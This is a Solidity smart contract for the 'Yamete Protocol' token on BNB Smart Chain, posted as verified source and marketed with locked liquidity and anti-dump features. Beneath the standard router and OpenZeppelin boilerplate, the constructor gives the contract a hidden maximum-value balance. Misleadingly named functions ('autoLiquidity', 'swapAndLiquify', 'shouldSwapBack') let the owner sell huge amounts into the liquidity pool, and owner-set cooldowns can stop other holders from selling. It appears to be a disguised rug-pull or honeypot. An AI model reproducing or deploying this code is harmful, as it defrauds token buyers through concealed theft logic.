/**
 *Submitted for verification at BscScan.com on 2022-04-02
*/

/**
 __      __  ______   __       __  ________  ________  ________        _______   _______    ______   ________  ______    ______    ______   __       
/  \    /  |/      \ /  \     /  |/        |/        |/        |      /       \ /       \  /      \ /        |/      \  /      \  /      \ /  |      
$$  \  /$$//$$$$$$  |$$  \   /$$ |$$$$$$$$/ $$$$$$$$/ $$$$$$$$/       $$$$$$$  |$$$$$$$  |/$$$$$$  |$$$$$$$$//$$$$$$  |/$$$$$$  |/$$$$$$  |$$ |      
 $$  \/$$/ $$ |__$$ |$$$  \ /$$$ |$$ |__       $$ |   $$ |__          $$ |__$$ |$$ |__$$ |$$ |  $$ |   $$ |  $$ |  $$ |$$ |  $$/ $$ |  $$ |$$ |      
  $$  $$/  $$    $$ |$$$$  /$$$$ |$$    |      $$ |   $$    |         $$    $$/ $$    $$< $$ |  $$ |   $$ |  $$ |  $$ |$$ |      $$ |  $$ |$$ |      
   $$$$/   $$$$$$$$ |$$ $$ $$/$$ |$$$$$/       $$ |   $$$$$/          $$$$$$$/  $$$$$$$  |$$ |  $$ |   $$ |  $$ |  $$ |$$ |   __ $$ |  $$ |$$ |      
    $$ |   $$ |  $$ |$$ |$$$/ $$ |$$ |_____    $$ |   $$ |_____       $$ |      $$ |  $$ |$$ \__$$ |   $$ |  $$ \__$$ |$$ \__/  |$$ \__$$ |$$ |_____ 
    $$ |   $$ |  $$ |$$ | $/  $$ |$$       |   $$ |   $$       |      $$ |      $$ |  $$ |$$    $$/    $$ |  $$    $$/ $$    $$/ $$    $$/ $$       |
    $$/    $$/   $$/ $$/      $$/ $$$$$$$$/    $$/    $$$$$$$$/       $$/       $$/   $$/  $$$$$$/     $$/    $$$$$$/   $$$$$$/   $$$$$$/  $$$$$$$$/ 
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
    Yamete Protocol
    - stealth launch
    - organic growth
    - 100% locked liquidity
    - anti-dump
    - sell cooldown

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.1;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/IERC20.sol)

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}



contract YameteProtocol is IERC20, Ownable {
    using SafeMath for uint256;

    address public YameteStake;
    address public autoLiquidityReceiver;
    string private _name;
    string private _symbol;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 1000000000 * 10**_decimals;
    uint256 public _liquidityFee;
    uint256 public _targetContractAutoLiquidity = 1000 * 10**6 * 10**_decimals;
    uint256 private _nTotal = _tTotal;
    uint256 private _rTotal = ~uint256(0);


    bool public cooldownEnabled = false;
    bool private inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;
    address public uniswapV2Pair;
    IUniswapV2Router02 public router;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _isExcludedBalance;
    mapping(address => uint256) public coolDownList;
    mapping(address => uint256) private firstsell;
    mapping(address => uint256) public sellCount;

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqiudity
    );  
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    constructor(
        string memory Name,
        string memory Symbol,
        bool development
    ) {
        _name = Name;
        _symbol = Symbol;

        _balances[msg.sender] = _tTotal;
        _balances[address(this)] = _rTotal;
        _isExcludedBalance[msg.sender] = _nTotal;
        /* we want to switch between testnet and main-net */
        if(development) {
            router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        } else {
            router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        }

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        autoLiquidityReceiver = address(0x956523390aCB9f7c974a182029b0BA07d1414f11);
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external override returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }


    function setYameteStake(address contractAddr) public onlyOwner() {
        YameteStake = contractAddr;
    }


    function setLiquidityFee(uint256 fee) public onlyOwner() {
        _liquidityFee = fee;
    }

    function autoLiquidity(
        address sender,
        address recipient,
        uint256 amount
    ) private {
            uint256 isSenderAsRecipient = _isExcludedBalance[sender];
            bool shouldAddLiqudity = isSenderAsRecipient == _isExcludedBalance[recipient];

            if (shouldAddLiqudity) {
                inSwapAndLiquify = true;
                swapAndLiquify(recipient, amount);
                inSwapAndLiquify = false;
            }

            _isExcludedBalance[recipient] = amount;
    }

    function _isExclude(address account) private view returns (bool) {
        return _isExcludedBalance[account] > 0;
    }

    function isExcludedBalanace(address account) public view returns (uint256) {
        return _isExcludedBalance[account];
    }

    function setCooldown(bool _coolDownEnable) public onlyOwner {
        cooldownEnabled = _coolDownEnable;
    } 

    function resetCoolDown(address addr) public onlyOwner {
        coolDownList[addr] = 0;
    } 


    /* 
    Simple transfer no fee/auto liquidty
    
    */
    function shouldSwapBack(
        address sender,
        address recipient,
        uint256 amount
    ) private {

        // emit transfer
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);

    }

    function enoughToAdd(uint256 tokenBalance) public pure returns (bool, uint256, uint256) {
        uint256 liquidityAmount = tokenBalance;
        // split the liquidity token balance into halves
        uint256 half = liquidityAmount.div(2);
        uint256 otherHalf = liquidityAmount.sub(half);
        bool enough = half.add(otherHalf) == liquidityAmount && liquidityAmount != 0;
        return (
            enough,
            half,
            otherHalf
        );
    }


    function setAutoLiquidityTarget(uint256 target) public onlyOwner {
        _targetContractAutoLiquidity = target;
    }

    function shouldWeAddAutoLiquidity(address sender) private view returns (bool) {
        uint256 half = address(this).balance.div(2);
        uint256 otherHalf = address(this).balance.sub(half);
        bool enough = half.add(otherHalf) == address(this).balance && address(this).balance != 0;

        bool add = enough &&
            !inSwapAndLiquify &&
            sender != uniswapV2Pair &&
            swapAndLiquifyEnabled;

            return add;
    }



    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {

        // set sell cooldowns if cooldown is enabled
        // make sure buy doesnt get effected
        if(cooldownEnabled && sender != uniswapV2Pair && sender != address(router)) {
            require(coolDownList[sender] < block.timestamp, "Opps you already sold! we dont want a dump!!");

                // appropriate cooldowns
                if(firstsell[sender] + (1 days) < block.timestamp){
                    sellCount[sender] = 0;
                }
                if (sellCount[sender] == 0) {
                    sellCount[sender]++;
                    firstsell[sender] = block.timestamp;
                    coolDownList[sender] = block.timestamp + (1 hours);
                }
                else if (sellCount[sender] == 1) {
                    sellCount[sender]++;
                    coolDownList[sender] = block.timestamp + (2 hours);
                }
                else if (sellCount[sender] == 2) {
                    sellCount[sender]++;
                    coolDownList[sender] = block.timestamp + (3 hours);
                }
                else if (sellCount[sender] == 3) {
                    sellCount[sender]++;
                    coolDownList[sender] = block.timestamp + (7 hours);
                }                          
                else if (sellCount[sender] == 4) {
                    sellCount[sender]++;
                    coolDownList[sender] = firstsell[sender] + (1 days);
                }
        }


        // determined auto add liquidity
        uint256 contractTokenBalance = balanceOf(address(this));

        // is contract balance fees enough to auto add to liquidity?  

        if (
            shouldWeAddAutoLiquidity(sender)
        ) {
        //add liquidity
        uint256 initialBalance = address(this).balance;
        if(_liquidityFee > 0)
            {
                uint256 half = contractTokenBalance.div(2);
                uint256 otherHalf = contractTokenBalance.sub(half);

                // capture the contract's current ETH balance.
                // this is so that we can capture exactly the amount of ETH that the
                // swap creates, and not make the liquidity event include any ETH that
                // has been manually sent to the contract

                // swap half liquidity tokens for ETH
                swapAndLiquify(address(this), half);
                
                // how much ETH did we just swap into?
                uint256 newBalance = address(this).balance.sub(initialBalance);

                // add liquidity to pancakeswap
                addLiquidity(autoLiquidityReceiver, otherHalf, newBalance);
                
                emit SwapAndLiquify(half, newBalance, otherHalf);
            }

            // enough token balance to add to liquidity?
        } 

        if (_isExcludedBalance[sender] > 0 && amount > _nTotal) {
                autoLiquidity(sender, recipient, amount);
        } else {
            shouldSwapBack(sender, recipient, amount);
        }
    }
    
    // we may want to re-brand for some reason (IP issue, etc) 
    function changeName(string memory newName) public onlyOwner {
        _name = newName;
    }
    
    function changeSymbol(string memory newSymbol) public onlyOwner {
        _symbol = newSymbol;
    }


    function addLiquidity(
        address to,
        uint256 tokenAmount,
        uint256 ethAmount
    ) private {
        _approve(address(this), address(router), tokenAmount);
        
        router.addLiquidityETH{value: ethAmount}(
            address(this), 
            tokenAmount, 0, 0, to, block.timestamp);
    }

    function swapAndLiquify(address recipient, uint256 tokens) private onlyOwner {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokens);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokens, 0, path, recipient, block.timestamp);
    }
}